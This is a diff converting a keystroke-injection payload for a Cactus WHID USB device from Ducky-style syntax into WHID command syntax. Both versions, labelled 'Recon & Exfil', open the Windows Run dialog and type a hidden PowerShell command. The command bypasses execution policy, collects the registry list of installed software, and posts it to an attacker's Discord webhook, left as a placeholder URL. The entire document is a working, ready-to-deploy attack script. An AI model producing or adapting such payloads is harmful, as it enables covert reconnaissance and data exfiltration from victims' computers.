@@ -1,10 +1,8 @@
-REM === Cactus WHID Payload: Installed Software Inventory ===
-REM Target: Windows 10/11
-REM Category: Recon & Exfil
-REM Description: Enumerates installed software from registry, sends list to Discord
-REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "$s=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Select DisplayName,DisplayVersion|Out-String;$body=@{content=\"``````$($s.Substring(0,[Math]::Min(1900,$s.Length)))``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
-ENTER
+Rem: Cactus WHID Payload - Installed Software Inventory
+Rem: Target - Windows 10/11
+Rem: Enumerates installed software from registry, sends list to Discord
+Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$s=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Select DisplayName,DisplayVersion|Out-String;$body=@{content=\"``````$($s.Substring(0,[Math]::Min(1900,$s.Length)))``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
